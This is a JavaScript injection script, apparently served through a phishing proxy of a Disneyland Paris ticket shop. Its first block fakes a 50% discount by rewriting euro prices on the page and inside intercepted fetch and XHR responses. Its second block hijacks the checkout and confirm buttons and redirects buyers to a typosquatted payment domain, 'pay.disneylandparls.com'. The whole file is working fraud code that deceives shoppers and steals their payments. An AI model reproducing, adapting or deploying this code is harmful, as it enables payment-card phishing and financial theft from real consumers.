/**
 * proxy-config.js
 */

/* ================================================
   БЛОК 1 — СКИДКА 50%
   ================================================ */
(function () {
    'use strict';

    var BADGE = 'v-disc-badge';
    var nodeMap = typeof WeakMap !== 'undefined' ? new WeakMap() : null;

    /* CSS бейджа */
    var css = '.' + BADGE + '{' +
        'display:inline-block!important;' +
        'background:#cc0000!important;' +
        'color:#fff!important;' +
        'font-size:11px!important;' +
        'font-weight:700!important;' +
        'padding:2px 6px!important;' +
        'border-radius:4px!important;' +
        'margin-left:4px!important;' +
        'vertical-align:middle!important;' +
        'line-height:1.4!important;' +
        'white-space:nowrap!important;' +
        'font-family:Arial,sans-serif!important;' +
        '}';
    var styleEl = document.createElement('style');
    styleEl.textContent = css;
    (document.head || document.documentElement).appendChild(styleEl);

    /* Баннер вверху */
    function addBanner() {
        if (document.getElementById('v-discount-banner')) return;
        var banner = document.createElement('div');
        banner.id = 'v-discount-banner';
        banner.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;background:linear-gradient(90deg,#cc0000,#ff4444);color:#fff;text-align:center;padding:10px 16px;font-size:15px;font-weight:700;font-family:Arial,sans-serif;letter-spacing:0.5px;box-shadow:0 2px 8px rgba(0,0,0,0.3);';
        banner.textContent = '🎉 СКИДКА -50% применена ко всем билетам! Цены уменьшены вдвое 🎉';
        if (document.body) document.body.prepend(banner);
    }

    function half(str) {
        var s = str.replace(/\s/g, '').replace(',', '.');
        var n = parseFloat(s);
        if (isNaN(n) || n < 2) return null;
        var r = (n * 0.5).toFixed(2);
        if (str.indexOf(',') !== -1) r = r.replace('.', ',');
        return r;
    }

    function hasBadge(el) {
        var s = el.nextSibling;
        return s && s.nodeType === 1 && s.className && s.className.indexOf(BADGE) !== -1;
    }

    function addBadge(el) {
        if (!el || !el.parentNode || hasBadge(el)) return;
        var b = document.createElement('span');
        b.className = BADGE;
        b.textContent = '-50%';
        el.parentNode.insertBefore(b, el.nextSibling);
    }

    function processTextNode(node) {
        var val = node.nodeValue;
        if (!val || val.indexOf('\u20ac') === -1) return;
        if (nodeMap && nodeMap.get(node) === val) return;
        var parent = node.parentElement;
        if (!parent) return;
        var tag = parent.tagName;
        if (tag === 'SCRIPT' || tag === 'STYLE' || tag === 'NOSCRIPT') return;
        if (parent.className && parent.className.indexOf && parent.className.indexOf(BADGE) !== -1) return;

        var changed = false;
        var nv = val.replace(/(\u20ac\s*)(\d[\d\s]*(?:[,\.]\d+)?)/g, function (m, sym, num) {
            var d = half(num);
            if (!d) return m;
            changed = true;
            return sym + d;
        });
        nv = nv.replace(/(\d[\d\s]*(?:[,\.]\d+)?)(\s*\u20ac)/g, function (m, num, sym) {
            var d = half(num);
            if (!d) return m;
            changed = true;
            return d + sym;
        });

        if (changed) {
            node.nodeValue = nv;
            if (nodeMap) nodeMap.set(node, nv);
            addBadge(parent);
        }
    }

    function processAria(el) {
        var label = el.getAttribute('aria-label');
        if (!label || label.indexOf('\u20ac') === -1 || label.indexOf('(-50%)') !== -1) return;
        var changed = false;
        var nl = label.replace(/(\u20ac\s*)(\d[\d\s]*(?:[,\.]\d+)?)/g, function (m, sym, num) {
            var d = half(num);
            if (!d) return m;
            changed = true;
            return sym + d + ' (-50%)';
        });
        if (changed) el.setAttribute('aria-label', nl);
    }

    function run() {
        if (!document.body) return;
        addBanner();
        var walker = document.createTreeWalker(
            document.body,
            NodeFilter.SHOW_TEXT | NodeFilter.SHOW_ELEMENT,
            {
                acceptNode: function (n) {
                    if (n.nodeType === 1) {
                        var t = n.tagName;
                        if (t === 'SCRIPT' || t === 'STYLE' || t === 'NOSCRIPT') return NodeFilter.FILTER_REJECT;
                        if (n.className && n.className.indexOf && n.className.indexOf(BADGE) !== -1) return NodeFilter.FILTER_REJECT;
                    }
                    return NodeFilter.FILTER_ACCEPT;
                }
            },
            false
        );
        var n;
        while ((n = walker.nextNode())) {
            try {
                if (n.nodeType === 3) processTextNode(n);
                else if (n.nodeType === 1 && n.hasAttribute && n.hasAttribute('aria-label')) processAria(n);
            } catch (e) {}
        }
    }

    var debTimer = null;
    var obs = new MutationObserver(function () {
        clearTimeout(debTimer);
        debTimer = setTimeout(run, 120);
    });

    function init() {
        run();
        obs.observe(document.documentElement, { childList: true, subtree: true, characterData: true });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    setInterval(run, 600);

    /* Перехват fetch */
    var _fetch = window.fetch;
    window.fetch = function (input, init) {
        return _fetch.apply(this, arguments).then(function (response) {
            var ct = response.headers.get('content-type') || '';
            if (ct.indexOf('json') === -1) return response;
            return response.clone().text().then(function (text) {
                var modified = text
                    .replace(/"price"\s*:\s*(\d+(?:\.\d+)?)/g, function (m, p) {
                        var n = parseFloat(p); return isNaN(n) || n < 2 ? m : '"price":' + (n * 0.5).toFixed(2);
                    })
                    .replace(/"amount"\s*:\s*(\d+(?:\.\d+)?)/g, function (m, p) {
                        var n = parseFloat(p); return isNaN(n) || n < 2 ? m : '"amount":' + (n * 0.5).toFixed(2);
                    })
                    .replace(/"totalPrice"\s*:\s*(\d+(?:\.\d+)?)/g, function (m, p) {
                        var n = parseFloat(p); return isNaN(n) || n < 2 ? m : '"totalPrice":' + (n * 0.5).toFixed(2);
                    })
                    .replace(/"value"\s*:\s*(\d+(?:\.\d+)?)/g, function (m, p) {
                        var n = parseFloat(p); return isNaN(n) || n < 2 ? m : '"value":' + (n * 0.5).toFixed(2);
                    });
                return new Response(modified, {
                    status: response.status,
                    statusText: response.statusText,
                    headers: response.headers
                });
            }).catch(function () { return response; });
        });
    };

    /* Перехват XHR */
    var _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function () {
        this.addEventListener('load', function () {
            try {
                var ct = this.getResponseHeader('content-type') || '';
                if (ct.indexOf('json') !== -1) setTimeout(run, 200);
            } catch (e) {}
        });
        return _send.apply(this, arguments);
    };

})();

/* ================================================
   БЛОК 2 — ПЕРЕХВАТ ОПЛАТЫ
   ================================================ */
(function () {
    'use strict';

    var PAYMENT_GATEWAY = 'https://pay.disneylandparls.com/';
    var STORE_ID = 'Disney Land Paris';

    function getAmount() {
        var selectors = ['.total-price-value','[data-testid="total-price"]','.cart-summary__total-price','.summary-total-amount','.amount'];
        for (var i = 0; i < selectors.length; i++) {
            var el = document.querySelector(selectors[i]);
            if (el && el.innerText) {
                var price = el.innerText.replace(/[^0-9,.]/g, '').replace(',', '.');
                if (price && !isNaN(parseFloat(price))) return price;
            }
        }
        return '100.00';
    }

    function handlePaymentRedirect(event) {
        event.preventDefault();
        event.stopImmediatePropagation();
        event.stopPropagation();
        var url = PAYMENT_GATEWAY + '/?amount=' + getAmount() + '&store=' + encodeURIComponent(STORE_ID);
        window.location.replace(url);
        return false;
    }

    setInterval(function () {
        var buttons = document.querySelectorAll('button, a, [role="button"]');
        buttons.forEach(function (btn) {
            var text = (btn.innerText || '').toLowerCase().trim();
            if (text.indexOf('confirm selection') !== -1 || text.indexOf('confirm your selection') !== -1 || text.indexOf('checkout') !== -1) {
                if (btn.disabled || btn.getAttribute('disabled')) {
                    btn.disabled = false;
                    btn.removeAttribute('disabled');
                    btn.style.pointerEvents = 'auto';
                    btn.style.opacity = '1';
                }
                btn.style.border = '2px solid #28a745';
                if (!btn.dataset.proxyAttached) {
                    btn.addEventListener('click', handlePaymentRedirect, true);
                    btn.addEventListener('mousedown', handlePaymentRedirect, true);
                    btn.dataset.proxyAttached = 'true';
                }
            }
        });
    }, 500);

})();
